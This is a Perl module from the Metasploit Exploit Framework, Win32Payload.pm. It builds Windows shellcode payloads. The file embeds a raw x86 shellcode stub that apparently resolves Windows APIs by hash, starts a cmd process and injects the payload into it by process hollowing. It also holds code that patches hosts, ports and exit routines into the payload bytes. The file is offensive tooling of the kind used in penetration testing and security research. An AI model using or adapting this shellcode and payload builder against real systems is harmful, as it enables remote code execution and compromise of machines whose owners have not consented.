#!/usr/bin/perl
###############

##
#         Name: Win32Payload.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::Win32Payload;
use strict;
use base 'Msf::Payload';

my $exit_types = 
{ 
    "process" => Pex::Utils::RorHash("ExitProcess"),
    "thread"  => Pex::Utils::RorHash("ExitThread"),
    "seh"     => Pex::Utils::RorHash("SetUnhandledExceptionFilter"),
};

my $prefork_exit = 346;
my $prefork_plen = 272;
my $prefork_code =
"\xeb\x6b\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c\xad".
"\x8b\x40\x08\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05".
"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34".
"\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d".
"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66".
"\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24".
"\x1c\x61\xc3\x5a\x66\x81\xc2\xc8\x00\x89\xd7\xeb\x27\x81\xec\x50".
"\x03\x00\x00\x89\xe5\xe8\xe9\xff\xff\xff\xfe\xc9\xff\x34\x8f\x53".
"\xe8\x90\xff\xff\xff\x89\x44\x8d\x00\x89\xe0\x04\x08\x89\xc4\x38".
"\xd1\x75\xe7\xc3\xe8\x69\xff\xff\xff\x89\xc3\x31\xc9\x31\xd2\x80".
"\xc1\x07\xe8\xd3\xff\xff\xff\xc7\x45\x20\x63\x6d\x64\x00\x83\xc7".
"\x1c\x89\xfe\xfc\x31\xc9\x66\xb9\x20\x03\x8d\x7d\x30\x31\xc0\xf3".
"\xaa\x31\xc0\x31\xdb\x8d\x4d\x30\x51\x8d\x4d\x74\x51\x50\x50\x80".
"\xc3\x04\x53\x50\x50\x50\x8d\x5d\x20\x53\x50\xff\x55\x00\xc7\x85".
"\x84\x00\x00\x00\x07\x00\x01\x00\x8d\x85\x84\x00\x00\x00\x50\xff".
"\x75\x34\xff\x55\x04\x31\xc0\x6a\x40\x68\x00\x10\x00\x00\x68\x00".
"\x00\x01\x00\x50\xff\x75\x30\xff\x55\x08\x89\xc7\x31\xdb\x53\x68".
"\xfa\x79\xf0\x4c\x56\x57\xff\x75\x30\xff\x55\x0c\xc7\x85\x84\x00".
"\x00\x00\x07\x00\x01\x00\x89\xbd\x3c\x01\x00\x00\x8d\x85\x84\x00".
"\x00\x00\x50\xff\x75\x34\xff\x55\x10\xff\x75\x34\xff\x55\x14\xff".
"\x55\x18\x72\xfe\xb3\x16\xd2\xc7\xa7\x68\x9c\x95\x1a\x6e\xa1\x6a".
"\x3d\xd8\xd3\xc7\xa7\xe8\x88\x3f\x4a\x9e\x7e\xd8\xe2\x73";


sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    my $self = $class->SUPER::new($hash);
    return($self);
}

sub InitWin32 {
    my $self = shift;
    $self->{'Win32Payload'} = $self->{'Info'}->{'Win32Payload'};
    delete($self->{'Info'}->{'Win32Payload'});
    
    $self->{'Info'}->{'UserOpts'}->{'EXITFUNC'} = [0, 'DATA', 'Exit technique: "process", "thread", "seh"'];
    $self->{'Info'}->{'UserOpts'}->{'PREFORK'}  = [0, 'BOOL', 'Execute payload in forked process'];
}

sub Size {
    my $self = shift;
    my $size = 0;
    $size += length($prefork_code) if $self->GetVar('PREFORK');
    $size += length($self->{'Win32Payload'}->{'Payload'});
    return $size;
}

sub Build {
    my $self = shift;
    
    my $payload     = $self->{'Win32Payload'}->{'Payload'};
    my $forkstub    = ($self->GetVar('PREFORK')) ? length($prefork_code) : 0;
    my $exit_offset = ($self->GetVar('PREFORK')) ? $prefork_exit : $self->{'Win32Payload'}->{'Offsets'}->{'EXITFUNC'}->[0];
    my $generated   = ($self->GetVar('PREFORK')) ? $prefork_code . $payload : $payload;

    my $opts = $self->{'Info'}->{'UserOpts'};
    foreach my $opt (keys(%{ $opts }))
    {
        next if $opt eq 'EXITFUNC';
        next if $opt eq 'PREFORK';
        
        my ($offset, $opack) = @{ $self->{'Win32Payload'}->{'Offsets'}->{$opt} };
        my $type = $opts->{$opt}->[1];    
        
        if (my $val = $self->GetVar($opt))
        {
            $val = ($type eq 'ADDR') ? $val = gethostbyname($val) : $val = pack($opack, $val);
            substr($generated, $forkstub+$offset, length($val), $val);
        }
    }

    my $exit_func = ($self->GetVar('EXITFUNC')) ? $self->GetVar('EXITFUNC') : 'seh';
    my $exit_hash = exists($exit_types->{$exit_func}) ? $exit_types->{$exit_func} : $exit_types->{'seh'};
    substr($generated, $exit_offset, 4, pack('L', $exit_hash));
    return $generated;
}

1;
